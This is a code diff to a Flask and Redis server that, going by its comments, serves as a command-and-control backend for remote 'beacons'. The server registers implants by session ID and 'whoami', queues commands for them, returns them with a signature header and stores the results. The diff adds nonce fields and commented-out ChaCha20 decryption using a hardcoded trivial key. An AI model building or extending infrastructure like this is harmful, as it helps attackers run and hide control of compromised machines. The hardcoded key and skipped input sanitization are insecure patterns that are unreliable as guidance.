@@ -6,12 +6,15 @@
 # so use postgresql to create a series of tables in a db
 # the flask webserver sees the UUID then performs a fetch from the db
 # e z p z
-
+import base64
 from datetime import datetime
 from flask import *
 import json
 import redis
 import string
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+
+key = b'12345678901234567890123456789012'  # A 256 bit (32 byte) key
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 app = Flask(__name__)
@@ -24,7 +27,11 @@ def home():
     # The beacon receives the initial reg and adds it to the db
     if request.method == 'GET':
         uuid = request.headers['APPSESSIONID']
+        #nonce = request.headers['nonce']
+        #nonce = base64.b64decode(nonce)
         whoami = request.headers['Res']
+        #whoami = base64.b64decode(whoami)
+        #whoami = chacha.decrypt(key, whoami, nonce)
 
         if set(uuid).difference(string.ascii_letters + string.digits):
             # We're not going to bother with input sanitization here
@@ -33,6 +40,7 @@ def home():
         else:
             structure = {
                 "WhoAmI": f"{whoami}",
+                "Nonce": f"0",
                 "Signature": "0",
                 "Retrieved": "0",  # Reset retrieved so we know the command was picked up
                 "Command": "0",
@@ -67,11 +75,13 @@ def session():
             LastInteraction = connector["LastInteraction"]
             result = connector["Result"]
             whoami = connector["WhoAmI"]
+            nonce = connector["Nonce"]
             signature = connector["Signature"]
             print(signature)
             # Set the command to 0
             structure = {
                 "WhoAmI": f"{whoami}",
+                "Nonce": f"{nonce}",
                 "Signature": f"{signature}",
                 "Retrieved": "1",  # Set retrieved to 1 so we know we got results
                 "Command": "0",
@@ -87,6 +97,7 @@ def session():
             resp = Response(
                 response=command, status=302, mimetype="text/plain")
             resp.headers['Verifier'] = signature
+            resp.headers['Nonce'] = nonce
             print(signature)
             return resp  # we've really got to RC4 encrypt this
 
@@ -99,6 +110,7 @@ def schema():
     # Set a default value on checkin to create the hostname/whoami to identify the beacon [needs testing]
     uuid = request.headers['APPSESSIONID']
     result = request.headers['Res']
+    #nonce = request.headers['nonce']
 
     command = conn.hget('UUID', uuid)  # Get the struct
     command = command.decode()  # Decode it from bytes
@@ -117,6 +129,7 @@ def schema():
         # Let's convert the command struct to a JSON object
         structure = {
             "WhoAmI": f"{whoami}",
+            "Nonce": f"0",
             "Signature": "0",
             "Retrieved": "1",  # Set retrieved to 1 so we know we got results
             "Command": "0",
